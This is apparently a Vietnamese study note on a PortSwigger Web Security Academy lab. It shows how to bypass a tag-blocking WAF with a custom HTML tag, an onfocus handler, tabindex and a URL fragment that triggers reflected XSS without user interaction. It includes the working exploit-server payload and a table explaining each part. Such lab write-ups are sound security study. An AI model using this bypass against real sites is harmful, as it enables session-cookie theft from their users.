
![[Pasted image 20261021074101.png]]

WAF chặn **tất cả tag HTML chuẩn** nhưng vẫn cho phép **custom tag**. Khai thác để tự động `alert(document.cookie)` mà không cần người dùng tương tác.

## Ý tưởng khai thác

Custom tag (ví dụ `<xss>`) không có hành vi mặc định, nhưng **vẫn nhận event handler** như tag bình thường. Vấn đề là event như `onfocus` cần được **focus** — mà ta không muốn phụ thuộc vào người dùng.

Giải pháp: dùng **fragment `#id`** trên URL. Khi trang tải, trình duyệt tự động focus vào element có `id` khớp với hash → `onfocus` tự kích hoạt.
[[0-xss cheetsheet]]
## Các bước

**1. Kiểm tra:** inject `<xss>` → thấy không bị chặn → custom tag dùng được.

**2. Tạo payload trên exploit server:**
```html
<script>
location = 'https://0a72005e04f365fa808c03f6008e00c7.web-security-academy.net//?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
![[Pasted image 20261021074806.png]]

**3. Phân tích payload:**

| Phần                             | Ý nghĩa                                                                              |
| :------------------------------- | :----------------------------------------------------------------------------------- |
| `%3Cxss ... %3E`                 | `<xss ...>` — custom tag lọt qua WAF                                                 |
| `id=x`                           | Gán id để fragment `#x` có thể trỏ tới                                               |
| `onfocus=alert(document.cookie)` | Event handler chạy khi element được focus                                            |
| `tabindex=1`                     | Bắt buộc — element không tương tác mặc định **không thể focus** nếu thiếu `tabindex` |
| `#x`                             | Fragment trên URL → trình duyệt tự focus vào element `id=x` ngay khi load            |

=> hiểu về tabindex
![[Pasted image 20261021080331.png]]

![[Pasted image 20261021080630.png]]
> [!NOTE]
> 
> - Khi tag bị chặn hết, **custom tag** vẫn hoạt động và vẫn nhận event handler.
> - `onfocus` cần **`tabindex`** thì element mới focus được.
> - **Fragment `#id`** là trick quan trọng: tự động focus element khi load trang → biến event "cần tương tác" (`onfocus`) thành **tự động**, đáp ứng yêu cầu "no user interaction".
> - Đây là ví dụ điển hình cho việc WAF **blacklist tag** không hiệu quả — chỉ cần một tag lạ là đủ.

![[Pasted image 20261021074815.png]]



